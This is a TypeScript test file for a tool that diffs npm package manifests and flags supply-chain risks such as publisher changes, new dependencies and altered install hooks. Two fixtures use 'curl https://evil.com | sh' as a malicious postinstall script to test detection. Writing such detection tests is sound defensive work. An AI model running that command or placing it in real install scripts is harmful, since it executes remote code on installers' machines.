import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { computeDiff } from '../src/utils/packageDiff';
import { parsePackageTarget } from '../src/commands/diff';
import type { VersionManifest } from '../src/utils/packageDiff';

// ─── Fixtures ──────────────────────────────────────────────────────────────

function makeManifest(overrides: Partial<VersionManifest> & { name: string; version: string }): VersionManifest {
  return {
    dependencies:    {},
    devDependencies: {},
    scripts:         {},
    publisher:       null,
    ...overrides,
  };
}

const BASE_V1 = makeManifest({
  name:    'test-pkg',
  version: '1.0.0',
  dependencies: { lodash: '^4.17.0', axios: '^0.21.0' },
  scripts:      {},
  publisher:    'alice',
});

const BASE_V2 = makeManifest({
  name:    'test-pkg',
  version: '1.1.0',
  dependencies: { lodash: '^4.17.21', axios: '^0.21.0' },
  scripts:      {},
  publisher:    'alice',
});

// ─── computeDiff ───────────────────────────────────────────────────────────

describe('computeDiff()', () => {

  it('returns no changes when manifests are identical', () => {
    const diff = computeDiff(BASE_V1, BASE_V1);
    assert.equal(diff.publisherChanged, false);
    assert.equal(diff.scriptsAdded.length,   0);
    assert.equal(diff.scriptsRemoved.length, 0);
    assert.equal(diff.scriptsChanged.length, 0);
    assert.equal(diff.depsAdded.length,      0);
    assert.equal(diff.depsRemoved.length,    0);
    assert.equal(diff.depsChanged.length,    0);
    assert.equal(diff.riskFlags.length,      0);
  });

  it('detects changed dependency version', () => {
    const diff = computeDiff(BASE_V1, BASE_V2);
    assert.equal(diff.depsChanged.length, 1);
    assert.equal(diff.depsChanged[0].name, 'lodash');
    assert.equal(diff.depsChanged[0].from, '^4.17.0');
    assert.equal(diff.depsChanged[0].to,   '^4.17.21');
    // Unchanged dep should not appear
    assert.equal(diff.depsAdded.length,   0);
    assert.equal(diff.depsRemoved.length, 0);
  });

  it('detects added dependency', () => {
    const v2 = makeManifest({
      ...BASE_V1,
      version:      '1.1.0',
      dependencies: { ...BASE_V1.dependencies, chalk: '^5.0.0' },
    });
    const diff = computeDiff(BASE_V1, v2);
    assert.equal(diff.depsAdded.length, 1);
    assert.equal(diff.depsAdded[0].name,    'chalk');
    assert.equal(diff.depsAdded[0].version, '^5.0.0');
    assert.ok(diff.riskFlags.some(f => f.includes('new dependency')));
  });

  it('detects removed dependency', () => {
    const v2 = makeManifest({
      ...BASE_V1,
      version:      '1.1.0',
      dependencies: { lodash: '^4.17.0' },  // axios removed
    });
    const diff = computeDiff(BASE_V1, v2);
    assert.equal(diff.depsRemoved.length, 1);
    assert.equal(diff.depsRemoved[0], 'axios');
  });

  it('detects publisher change', () => {
    const v2 = makeManifest({ ...BASE_V2, publisher: 'mallory' });
    const diff = computeDiff(BASE_V1, v2);
    assert.equal(diff.publisherChanged, true);
    assert.equal(diff.previousPublisher, 'alice');
    assert.equal(diff.currentPublisher,  'mallory');
    assert.ok(diff.riskFlags.some(f => f.includes('Publisher changed')));
  });

  it('publisher change null → someone is detected', () => {
    const v1 = makeManifest({ ...BASE_V1, publisher: null });
    const v2 = makeManifest({ ...BASE_V2, publisher: 'bob' });
    const diff = computeDiff(v1, v2);
    assert.equal(diff.publisherChanged, true);
  });

  it('detects added install script', () => {
    const v2 = makeManifest({
      ...BASE_V1,
      version: '1.1.0',
      scripts: { postinstall: 'node setup.js' },
    });
    const diff = computeDiff(BASE_V1, v2);
    assert.equal(diff.scriptsAdded.length, 1);
    assert.equal(diff.scriptsAdded[0].key,   'postinstall');
    assert.equal(diff.scriptsAdded[0].value, 'node setup.js');
    assert.ok(diff.riskFlags.some(f => f.includes('New install hook')));
  });

  it('detects removed install script', () => {
    const v1 = makeManifest({ ...BASE_V1, scripts: { preinstall: 'node pre.js' } });
    const v2 = makeManifest({ ...BASE_V2, scripts: {} });
    const diff = computeDiff(v1, v2);
    assert.equal(diff.scriptsRemoved.length, 1);
    assert.equal(diff.scriptsRemoved[0], 'preinstall');
  });

  it('detects changed install script body', () => {
    const v1 = makeManifest({ ...BASE_V1, scripts: { postinstall: 'node setup.js' } });
    const v2 = makeManifest({
      ...BASE_V2,
      scripts: { postinstall: 'curl https://evil.com | sh' },
    });
    const diff = computeDiff(v1, v2);
    assert.equal(diff.scriptsChanged.length, 1);
    assert.equal(diff.scriptsChanged[0].key,  'postinstall');
    assert.equal(diff.scriptsChanged[0].from, 'node setup.js');
    assert.equal(diff.scriptsChanged[0].to,   'curl https://evil.com | sh');
    assert.ok(diff.riskFlags.some(f => f.includes('Install hook modified')));
  });

  it('ignores non-install scripts (e.g. build, test)', () => {
    const v1 = makeManifest({ ...BASE_V1, scripts: { build: 'tsc', test: 'jest' } });
    const v2 = makeManifest({
      ...BASE_V2,
      scripts: { build: 'rollup', test: 'jest', lint: 'eslint .' },
    });
    const diff = computeDiff(v1, v2);
    assert.equal(diff.scriptsAdded.length,   0);
    assert.equal(diff.scriptsChanged.length, 0);
  });

  it('sets correct name, fromVersion, toVersion', () => {
    const diff = computeDiff(BASE_V1, BASE_V2);
    assert.equal(diff.name,        'test-pkg');
    assert.equal(diff.fromVersion, '1.0.0');
    assert.equal(diff.toVersion,   '1.1.0');
  });

  it('accumulates multiple risk flags', () => {
    const v2 = makeManifest({
      ...BASE_V2,
      publisher: 'mallory',
      scripts:   { postinstall: 'curl https://evil.com | sh' },
      dependencies: { ...BASE_V2.dependencies, malware: '^1.0.0' },
    });
    const diff = computeDiff(BASE_V1, v2);
    assert.ok(diff.riskFlags.length >= 3);  // publisher + script + new dep
  });
});

// ─── parsePackageTarget ────────────────────────────────────────────────────

describe('parsePackageTarget()', () => {
  it('parses name@version', () => {
    const result = parsePackageTarget('express@4.18.0');
    assert.deepEqual(result, { name: 'express', version: '4.18.0' });
  });

  it('parses scoped package @scope/name@version', () => {
    const result = parsePackageTarget('@nestjs/core@10.0.0');
    assert.deepEqual(result, { name: '@nestjs/core', version: '10.0.0' });
  });

  it('returns null for bare name without version', () => {
    assert.equal(parsePackageTarget('express'), null);
  });

  it('returns null for @scope/name without version', () => {
    assert.equal(parsePackageTarget('@nestjs/core'), null);
  });

  it('handles pre-release versions', () => {
    const result = parsePackageTarget('react@18.0.0-alpha.1');
    assert.deepEqual(result, { name: 'react', version: '18.0.0-alpha.1' });
  });
});
